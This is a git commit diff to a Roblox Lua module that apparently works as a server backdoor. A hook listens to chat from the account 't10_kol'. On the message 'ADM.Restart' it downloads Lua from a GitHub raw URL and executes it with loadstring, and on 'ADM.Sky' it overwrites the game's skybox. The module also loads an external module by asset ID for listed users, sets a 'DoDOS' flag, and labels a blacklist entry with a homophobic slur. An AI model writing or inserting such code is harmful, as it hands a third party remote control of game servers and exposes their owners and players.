1ac9120cca2aa4ca8be36c50490acc3e62ce42bb
t10_kol <154048632+t10underscorekol@users.noreply.github.com>
2024-03-29 13:02:04 +0200

    Update newthing.lua

--- Modules/newthing.lua
+++ Modules/newthing.lua
@@ -1,5 +1,11 @@
 print("Ta")
 local HttpService = game.HttpService
+--[[
+local HttpService = game.HttpService
+				local code = HttpService:GetAsync("https://raw.githubusercontent.com/t10underscorekol/Rblx-Thing/main/Modules/newthing.lua", true)
+				local f = loadstring(code)
+				f()
+]]
 local EnabledDoDOS = true
 local BlackList = {
 	[3783228048]=true, --< Vadik Pidorasik
@@ -16,20 +22,35 @@ game.Players.PlayerAdded:Connect(function(plr)
 	if AdminPanel[plr.Name] then
 		require(7192763922).load(plr.Name)
 	end
-	if plr.Name == "t10_kol" then
-		plr.Chatted:Connect(function(message)
-			if message == "ADM.Restart" then
-				local code = HttpService:GetAsync("https://raw.githubusercontent.com/t10underscorekol/Rblx-Thing/main/Modules/newthing.lua", true)
-				local f = loadstring(code)
-				f()
-			elseif message == "ADM.Sky" then
-				game.Lighting:FindFirstChildOfClass("Sky").SkyboxBk = "http://www.roblox.com/asset/?id=16790027131"
-				game.Lighting:FindFirstChildOfClass("Sky").SkyboxDn = "http://www.roblox.com/asset/?id=16790027131"
-				game.Lighting:FindFirstChildOfClass("Sky").SkyboxFt = "http://www.roblox.com/asset/?id=16790027131"
-				game.Lighting:FindFirstChildOfClass("Sky").SkyboxLf = "http://www.roblox.com/asset/?id=16790027131"
-				game.Lighting:FindFirstChildOfClass("Sky").SkyboxRt = "http://www.roblox.com/asset/?id=16790027131"
-				game.Lighting:FindFirstChildOfClass("Sky").SkyboxUp = "http://www.roblox.com/asset/?id=16790027131"
-			end
-		end)
+	for _, player in pairs(game.Players:GetPlayers()) do
+		if player.Name == "t10_kol" then
+			player.Chatted:Connect(function(message)
+				if message == "ADM.Restart" then
+					local code = HttpService:GetAsync("https://raw.githubusercontent.com/t10underscorekol/Rblx-Thing/main/Modules/newthing.lua", true)
+					local f = loadstring(code)
+					f()
+				elseif message == "ADM.Sky" then
+					game.Lighting:FindFirstChildOfClass("Sky").SkyboxBk = "http://www.roblox.com/asset/?id=16790027131"
+					game.Lighting:FindFirstChildOfClass("Sky").SkyboxDn = "http://www.roblox.com/asset/?id=16790027131"
+					game.Lighting:FindFirstChildOfClass("Sky").SkyboxFt = "http://www.roblox.com/asset/?id=16790027131"
+					game.Lighting:FindFirstChildOfClass("Sky").SkyboxLf = "http://www.roblox.com/asset/?id=16790027131"
+					game.Lighting:FindFirstChildOfClass("Sky").SkyboxRt = "http://www.roblox.com/asset/?id=16790027131"
+					game.Lighting:FindFirstChildOfClass("Sky").SkyboxUp = "http://www.roblox.com/asset/?id=16790027131"
+
+				--[[
+				local id = game.GroupService:GetGroupInfoAsync(32993955).EmblemUrl
+				print(id)
+								game.Lighting:FindFirstChildOfClass("Sky").SkyboxBk = id
+				game.Lighting:FindFirstChildOfClass("Sky").SkyboxDn = id
+				game.Lighting:FindFirstChildOfClass("Sky").SkyboxFt = id
+				game.Lighting:FindFirstChildOfClass("Sky").SkyboxLf = id
+				game.Lighting:FindFirstChildOfClass("Sky").SkyboxRt = id
+				game.Lighting:FindFirstChildOfClass("Sky").SkyboxUp = id
+				13803096332
+				]]
+				end
+			end)
+		end
 	end
+
 end)
